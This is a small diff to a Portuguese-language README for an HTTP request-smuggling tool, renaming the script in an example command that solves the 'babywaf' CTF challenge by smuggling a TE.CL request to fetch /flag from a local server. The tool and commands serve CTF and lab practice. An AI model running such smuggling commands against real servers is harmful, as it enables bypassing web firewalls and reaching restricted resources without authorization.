@@ -93,7 +93,7 @@ python shmugley.py http://127.0.0.1:8080 -m clte -X1 GET --two /files/ -H2 "X-gu
 Para resolver o desafio babywaf do spamandhex 2020:
 
 ```sh
-python main.py -m tecl http://127.0.0.1:8080 -X1 GET -X2 GET --one 404 --two /flag -a / -v3
+python shmugley.py -m tecl http://127.0.0.1:8080 -X1 GET -X2 GET --one 404 --two /flag -a / -v3
 ```
 
 # Labs
